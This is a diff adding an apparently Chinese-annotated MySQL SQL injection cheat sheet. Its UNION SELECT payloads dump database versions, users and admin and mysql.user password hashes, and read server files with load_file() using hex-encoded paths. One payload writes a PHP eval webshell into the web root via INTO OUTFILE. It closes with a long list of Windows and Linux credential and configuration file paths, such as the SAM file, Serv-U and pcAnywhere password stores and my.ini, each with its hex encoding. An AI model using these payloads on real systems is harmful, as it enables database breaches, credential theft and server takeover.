@@ -1,0 +1,169 @@
+
+Mysql sqlinjection code
+
+# %23 -- /* /**/   注释
+
+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--
+
+and+(select+count(*)+from+mysql.user)>0--  判断是否能读取MYSQL表 
+
+CONCAT_WS(CHAR(32,58,32),user(),database(),version())   用户名 数据库 MYSQL版本
+
+union+select+1,2,3,CONCAT_WS(CHAR(32,58,32),user(),database(),version()),5,6,7,8,9,10,7--  
+
+union all select 1,concat(user,0x3a,pass,0x3a,email) from users/*  获取users表的用户名 密码 email 信息 
+
+unhex(hex(@@version))    unhex方式查看版本
+
+union all select 1,unhex(hex(@@version)),3/*
+
+convert(@@version using latin1) latin 方式查看版本
+
+union+all+select+1,convert(@@version using latin1),3-- 
+
+CONVERT(user() USING utf8)
+union+all+select+1,CONVERT(user() USING utf8),3--  latin方式查看用户名
+
+
+and+1=2+union+select+1,passw,3+from+admin+from+mysql.user--   获取MYSQL帐户信息
+
+union+all+select+1,concat(user,0x3a,password),3+from+mysql.user--   获取MYSQL帐户信息
+
+
+
+
+union+select+1,concat_ws(0x3a,username,password),3+FROM+ADMIN--  读取admin表 username password 数据  0x3a 为“：” 冒号
+
+union+all+select+1,concat(username,0x3a,password),3+from+admin--  
+
+union+all+select+1,concat(username,char(58),password),3+from admin--
+
+
+UNION+SELECT+1,2,3,4,load_file(0x2F6574632F706173737764),6--  通过load_file（）函数读取文件
+
+
+UNION+SELECT+1,2,3,4,replace(load_file(0x2F6574632F706173737764),0x3c,0x20),6--  通过replace函数将数据完全显示
+
+union+select+1,2,3,char(0x3C3F706870206576616C28245F504F53545B39305D3F3B3E),5,6,7,8,9,10,7+into+outfile+'d:\web\90team.php'--  在web目录写入一句话木马
+
+<?php+eval($_POST[90]?;>   为上面16进制编码后的一句话原型
+
+
+union+select+1,2,3,load_file(d:\web\logo123.jpg),5,6,7,8,9,10,7+into+outfile+'d:\web\90team.php'--   将PHP马改成图片类型上传之网站，再通过into outfile 写入web目录
+
+
+常用查询函数
+
+1:system_user() 系统用户名
+2:user()        用户名
+3:current_user  当前用户名
+4:session_user()连接数据库的用户名
+5:database()    数据库名
+6:version()     MYSQL数据库版本  @@version
+7:load_file()   MYSQL读取本地文件的函数
+8:@@datadir     读取数据库路径
+9:@@basedir    MYSQL 安装路径
+10:@@version_compile_os   操作系统
+
+
+WINDOWS下:
+c:/boot.ini          //查看系统版本     0x633A2F626F6F742E696E690D0A
+
+c:/windows/php.ini   //php配置信息      0x633A2F77696E646F77732F7068702E696E69
+
+c:/windows/my.ini    //MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码  0x633A2F77696E646F77732F6D792E696E69
+
+c:/winnt/php.ini      0x633A2F77696E6E742F7068702E696E69
+
+c:/winnt/my.ini       0x633A2F77696E6E742F6D792E696E69
+
+c:\mysql\data\mysql\user.MYD  //存储了mysql.user表中的数据库连接密码  0x633A5C6D7973716C5C646174615C6D7973716C5C757365722E4D5944
+
+c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini  //存储了虚拟主机网站路径和密码
+
+0x633A5C50726F6772616D2046696C65735C5268696E6F536F66742E636F6D5C536572762D555C53657276554461656D6F6E2E696E69
+ 
+c:\Program Files\Serv-U\ServUDaemon.ini   0x633A5C50726F6772616D2046696C65735C536572762D555C53657276554461656D6F6E2E696E69
+
+c:\windows\system32\inetsrv\MetaBase.xml  //IIS配置文件
+
+c:\windows\repair\sam  //存储了WINDOWS系统初次安装的密码
+
+c:\Program Files\ Serv-U\ServUAdmin.exe  //6.0版本以前的serv-u管理员密码存储于此
+
+c:\Program Files\RhinoSoft.com\ServUDaemon.exe
+
+C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif  文件
+
+//存储了pcAnywhere的登陆密码
+
+c:\Program Files\Apache Group\Apache\conf \httpd.conf 或C:\apache\conf \httpd.conf //查看     WINDOWS系统apache文件   
+0x633A5C50726F6772616D2046696C65735C4170616368652047726F75705C4170616368655C636F6E66205C68747470642E636F6E66
+
+c:/Resin-3.0.14/conf/resin.conf   //查看jsp开发的网站 resin文件配置信息.  0x633A2F526573696E2D332E302E31342F636F6E662F726573696E2E636F6E66
+
+c:/Resin/conf/resin.conf  0x633A2F526573696E2F636F6E662F726573696E2E636F6E66
+
+
+/usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机  0x2F7573722F6C6F63616C2F726573696E2F636F6E662F726573696E2E636F6E66
+
+d:\APACHE\Apache2\conf\httpd.conf  0x643A5C4150414348455C417061636865325C636F6E665C68747470642E636F6E66
+
+C:\Program Files\mysql\my.ini  0x433A5C50726F6772616D2046696C65735C6D7973716C5C6D792E696E69
+
+c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置    0x633A5C77696E646F77735C73797374656D33325C696E65747372765C4D657461426173652E786D6C
+
+C:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码  0x433A5C6D7973716C5C646174615C6D7973716C5C757365722E4D5944
+
+
+LUNIX/UNIX下:
+
+/etc/passwd  0x2F6574632F706173737764
+
+/usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件  0x2F7573722F6C6F63616C2F6170702F617061636865322F636F6E662F68747470642E636F6E66
+
+/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置  0x2F7573722F6C6F63616C2F6170702F617061636865322F636F6E662F65787472612F68747470642D76686F7374732E636F6E66
+
+/usr/local/app/php5/lib/php.ini //PHP相关设置   0x2F7573722F6C6F63616C2F6170702F706870352F6C69622F7068702E696E69
+
+/etc/sysconfig/iptables //从中得到防火墙规则策略  0x2F6574632F737973636F6E6669672F69707461626C657320
+
+/etc/httpd/conf/httpd.conf // apache配置文件    0x2F6574632F68747470642F636F6E662F68747470642E636F6E66   
+  
+/etc/rsyncd.conf //同步程序配置文件              0x2F6574632F7273796E63642E636F6E66
+
+/etc/my.cnf //mysql的配置文件   0x2F6574632F6D792E636E66
+
+/etc/redhat-release //系统版本   0x2F6574632F7265646861742D72656C65617365
+
+/etc/issue           0x2F6574632F6973737565
+
+/etc/issue.net       0x2F6574632F69737375652E6E6574
+ 
+/usr/local/app/php5/lib/php.ini //PHP相关设置  0x2F7573722F6C6F63616C2F6170702F706870352F6C69622F7068702E696E69
+
+/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置   0x2F7573722F6C6F63616C2F6170702F617061636865322F636F6E662F65787472612F68747470642D76686F7374732E636F6E66
+
+/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件  0x2F6574632F68747470642F636F6E662F68747470642E636F6E66 
+
+0x2F7573722F6C6F63616C2F61706368652F636F6E662F68747470642E636F6E66
+
+/usr/local/resin-3.0.22/conf/resin.conf  针对3.0.22的RESIN配置文件查看  0x2F7573722F6C6F63616C2F726573696E2D332E302E32322F636F6E662F726573696E2E636F6E66
+
+/usr/local/resin-pro-3.0.22/conf/resin.conf 同上   0x2F7573722F6C6F63616C2F726573696E2D70726F2D332E302E32322F636F6E662F726573696E2E636F6E66
+
+/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看  
+
+0x2F7573722F6C6F63616C2F6170702F617061636865322F636F6E662F65787472612F68747470642D76686F7374732E636F6E66
+
+
+/etc/sysconfig/iptables 查看防火墙策略 0x2F6574632F737973636F6E6669672F69707461626C6573
+
+load_file(char(47))  列出FreeBSD,Sunos系统根目录
+
+
+replace(load_file(0x2F6574632F706173737764),0x3c,0x20)
+
+replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))
+
+上面两个是查看一个PHP文件里完全显示代码.有些时候不替换一些字符,如 "<" 替换成"空格" 返回的是网页.而无法查看到代码.
